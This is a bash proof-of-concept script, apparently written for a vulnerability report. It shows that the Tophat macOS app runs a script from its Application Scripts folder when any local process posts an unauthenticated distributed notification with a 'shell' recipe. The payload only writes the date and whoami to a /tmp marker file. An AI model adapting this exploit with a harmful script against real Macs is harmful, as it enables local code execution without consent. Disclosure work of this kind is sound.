#!/bin/bash
# Local reproduction on any Mac with the released Tophat installed.
# Usage: bash local_repro.sh
set -eux
APP_SCRIPTS="$HOME/Library/Application Scripts/com.shopify.Tophat"
mkdir -p "$APP_SCRIPTS"
cat > "$APP_SCRIPTS/x.sh" <<'S'
#!/bin/bash
{
  echo "[tophat-shell-poc] $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "[tophat-shell-poc] whoami=$(whoami)"
} > /tmp/tophat_shell_proof.txt
[ -n "$2" ] && echo "dummy" > "$2/dummy.txt"
S
chmod +x "$APP_SCRIPTS/x.sh"
open -g /Applications/Tophat.app || true
sleep 5
cat > /tmp/post.swift <<'SWIFT'
import Foundation
let userInfo: [String: Any] = [
    "id": UUID().uuidString,
    "recipes": [[
        "artifactProviderID": "shell",
        "artifactProviderParameters": ["script": "x.sh"],
        "launchArguments": [],
        "platformHint": "iOS"
    ]]
]
DistributedNotificationCenter.default().postNotificationName(
    Notification.Name("Tophat.InstallFromRecipesRequest"),
    object: nil,
    userInfo: userInfo,
    deliverImmediately: true
)
Thread.sleep(forTimeInterval: 8)
SWIFT
swift /tmp/post.swift
sleep 3
[ -f /tmp/tophat_shell_proof.txt ] && cat /tmp/tophat_shell_proof.txt || echo "no marker written"
